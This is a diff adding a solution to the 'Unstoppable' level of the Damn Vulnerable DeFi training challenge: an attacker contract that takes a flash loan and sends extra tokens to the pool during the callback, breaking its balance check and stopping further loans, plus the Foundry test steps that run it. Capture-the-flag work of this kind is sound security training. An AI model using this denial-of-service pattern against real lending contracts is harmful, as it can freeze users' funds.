@@ -8,6 +8,24 @@ import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {UnstoppableLender} from "../../../src/Contracts/unstoppable/UnstoppableLender.sol";
 import {ReceiverUnstoppable} from "../../../src/Contracts/unstoppable/ReceiverUnstoppable.sol";
 
+contract Attacks {
+    UnstoppableLender internal pool;
+    address internal owner;
+
+    constructor(address poolAddr) {
+        pool = UnstoppableLender(poolAddr);
+        owner = msg.sender;
+    }
+
+    function hack(uint256 amount) public {
+        pool.flashLoan(amount);
+    }
+
+    function receiveTokens(address token, uint256 amount) public {
+        DamnValuableToken(token).transferFrom(owner, msg.sender, amount * 2);
+    }
+}
+
 contract Unstoppable is Test {
     uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
     uint256 internal constant INITIAL_ATTACKER_TOKEN_BALANCE = 100e18;
@@ -60,6 +78,15 @@ contract Unstoppable is Test {
         /**
          * EXPLOIT START *
          */
+        // I need to make poolBalance != balanceBefore
+
+        // prank attacker
+        vm.startPrank(attacker);
+        Attacks atk = new Attacks(address(unstoppableLender));
+        dvt.approve(address(atk), type(uint256).max);
+        atk.hack(10);
+        vm.stopPrank();
+
         /**
          * EXPLOIT END *
          */
